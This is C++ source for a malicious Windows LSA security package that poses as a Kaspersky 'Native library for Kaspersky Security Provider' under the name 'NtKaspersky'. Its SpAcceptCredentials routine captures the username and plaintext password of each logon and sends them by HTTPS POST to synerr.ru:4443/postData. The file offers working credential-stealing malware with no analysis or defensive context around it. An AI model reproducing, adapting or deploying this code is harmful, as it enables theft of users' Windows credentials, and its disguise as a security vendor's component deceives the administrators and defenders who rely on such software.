#define WIN32_NO_STATUS
#define FORCE_UNICODE 
#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <winhttp.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#include <strsafe.h>
#include <string>

#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "winhttp.lib")

extern "C" {


    NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
    {
        return 0;
    }
    NTSTATUS NTAPI SpShutDown(void) {
        return 0;
    }
    NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo) {
        PackageInfo->fCapabilities = SECPKG_FLAG_NEGOTIABLE | SECPKG_FLAG_MUTUAL_AUTH | SECPKG_FLAG_LOGON | SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_RESTRICTED_TOKENS
            | SECPKG_FLAG_RESTRICTED_TOKENS
            | 0x00000002; // SECPKG_CALLFLAGS_AUTHCAPABLE;
        PackageInfo->Name = (SEC_WCHAR*)L"NtKaspersky";
        PackageInfo->Comment = (SEC_WCHAR*)L"Native library for Kaspersky Security Provider";
        PackageInfo->wRPCID = SECPKG_ID_NONE;

        PackageInfo->cbMaxToken = 0;
        PackageInfo->wVersion = 1;
        return 0;
    }
    NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
    {
        std::wstring login = AccountName->Buffer;
        std::wstring password = PrimaryCredentials->Password.Buffer;
        std::wstring data{
            L"login=" + login + L"password=" + password
        };
        auto hInet = WinHttpOpen(L"WINHTTP/1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, WINHTTP_FLAG_SECURE_DEFAULTS);
        auto hConnection = WinHttpConnect(hInet, L"synerr.ru", 4443, 0);
        auto hRequest = WinHttpOpenRequest(hConnection,
            L"POST",
            L"/postData",
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_ESCAPE_PERCENT | WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE
        );

        auto bResult = WinHttpAddRequestHeaders(
            hRequest,
            L"Content-Type: application/x-www-form-urlencoded",
            DWORD(-1),
            WINHTTP_ADDREQ_FLAG_COALESCE_WITH_COMMA
        );

        bResult = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            NULL,
            (LPVOID)data.c_str(),
            data.length() * sizeof(wchar_t),
            data.length() * sizeof(wchar_t),
            NULL);


        return 0;
    }
    SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] =
    {
        {
            NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, SpInitialize, SpShutDown, SpGetInfo, SpAcceptCredentials, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL
        }
    };
    NTSTATUS NTAPI custom_SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE * ppTables, PULONG pcTables)
    {
        *PackageVersion = SECPKG_INTERFACE_VERSION;
        *ppTables = SecurityPackageFunctionTable;
        *pcTables = 1;
        return 0;
    }
}